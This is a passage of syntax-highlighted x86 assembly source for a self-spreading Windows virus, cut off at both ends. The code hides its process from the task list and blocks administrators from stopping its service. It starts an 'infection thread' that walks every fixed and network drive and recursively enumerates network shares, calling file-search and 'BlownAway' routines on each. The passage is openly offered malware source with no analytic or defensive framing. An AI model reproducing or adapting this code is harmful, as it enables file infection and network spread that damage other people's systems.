             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Kernel32_Base</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetProcAddress</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VS_00</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">  
                                              </span><span class="sc1">; register our process in order</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">                  </span><span class="sc1">; to vanish from the task list</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                  
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">1000d</span><span class="sc0">      </span><span class="sc1">; wait 8 seconds</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc5">VS_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartInfectionThread</span><span class="sc0">

</span><span class="sc5">VS_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">VService</span><span class="sc0">                  </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -----------------------   NT Service Dispatcher   ----------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">ServiceDispatcher</span><span class="sc0">         </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">Service_Handle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetVS</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ServiceHandler</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Service</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RegisterServiceCtrlHandlerA</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">Service_Handle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">04</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc2">07</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">                
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">Service_Handle</span><span class="sc0">     </span><span class="sc1">; now tell windows our service</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetServiceStatus</span><span class="sc0">   </span><span class="sc1">; correctly started</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">1000d</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Sleep</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartInfectionThread</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">ServiceDispatcher</span><span class="sc0">         </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; --------------------------   Service Handler   -------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">ServiceHandler</span><span class="sc0">            </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">

                                       
             </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">; if the admin tries to halt the</span><span class="sc0">
                                       </span><span class="sc1">; service, he'll get a system error</span><span class="sc0">

</span><span class="sc5">ServiceHandler</span><span class="sc0">            </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -------------------   Thread Creation Routine   ------------------ ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">StartInfectionThread</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">ThreadId</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Rand</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ThreadId</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VThread</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateThread</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">StartInfectionThread</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ----------------------------   Viral Thread   --------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">VThread</span><span class="sc0">                   </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetVS</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectDrives</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">60d</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000d</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Sleep</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRand</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1F</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VThread</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectNetwork</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VThread</span><span class="sc0">


</span><span class="sc5">VThread</span><span class="sc0">                   </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ---------------------   Network Infection Routine   --------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">InfectNetwork</span><span class="sc0">             </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">MPR_Name</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">LoadLibraryA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">INet_Failed</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">MPR_Functions</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DLL_Relocate</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">INet_Failed</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NetSearch</span><span class="sc0">        

</span><span class="sc5">INet_Failed</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">InfectNetwork</span><span class="sc0">            </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ----------------------   Valid Drive Test Routine   --------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">InfectDrives</span><span class="sc0">              </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Tick</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">' \:@'</span><span class="sc0">
                                          
</span><span class="sc5">ID_TestDrive</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetDriveTypeA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">                     </span><span class="sc1">; fixed disk</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ID_DriveOk</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                     </span><span class="sc1">; network drive</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ID_Invalid</span><span class="sc0">

</span><span class="sc5">ID_DriveOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">BlownAway</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FileSearch</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

</span><span class="sc5">ID_Invalid</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
             </span><span class="sc6">jna</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ID_TestDrive</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">InfectDrives</span><span class="sc0">              </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -----------------   Recursive Computer Search Routine   ----------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">NetSearch</span><span class="sc0">                 </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">      </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">WNetStructAddr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc1">; pointer to the network struct (20h)</span><span class="sc0">

</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">EnumBufferAddr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \   </span><span class="sc1">; network buffer address</span><span class="sc0">
             </span><span class="sc5">EnumBufferSize</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \   </span><span class="sc1">; network buffer size (4000h)</span><span class="sc0">
             </span><span class="sc5">EnumNB_Objects</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc1">; number of network structs enumerated</span><span class="sc0">

</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">EnumBufferSize</span><span class="sc4">,</span><span class="sc2">4000</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc5">EnumNB_Objects</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">WNetStructAddr</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">WNetStructAddr</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">WNetOpenEnumA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">NET_Close</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">04</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">1000</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">4000</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_Close</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">EnumBufferAddr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">NET_00</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">EnumBufferAddr</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EnumBufferSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EnumNB_Objects</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">WNetStructAddr</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">WNetEnumResourceA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_Free</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EnumNB_Objects</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_00</span><span class="sc0">

</span><span class="sc5">NET_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; computer resource name</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; (\\XXX\C, for example)</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_03</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0041</span><span class="sc0">       </span><span class="sc1">; floppy ?</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_03</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">NET_02</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_02</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">BlownAway</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FileSearch</span><span class="sc0">

</span><span class="sc5">NET_03</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_04</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NetSearch</span><span class="sc0">

</span><span class="sc5">NET_04</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">NET_01</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NET_00</span><span class="sc0">

</span><span class="sc5">NET_Free</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">8000</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">EnumBufferAddr</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">VirtualFree</span><span class="sc0">

</span><span class="sc5">NET_Close</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">WNetStructAddr</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">WNetCloseEnum</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">NetSearch</span><span class="sc0">                 </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -------------------   Recursive File Search Routine   ------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">FileSearch</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">CurrentDirEnd</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">SearchHandle</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CurrentDirEnd</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">002A2E2A</span><span class="sc0">  </span><span class="sc1">; *.*</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
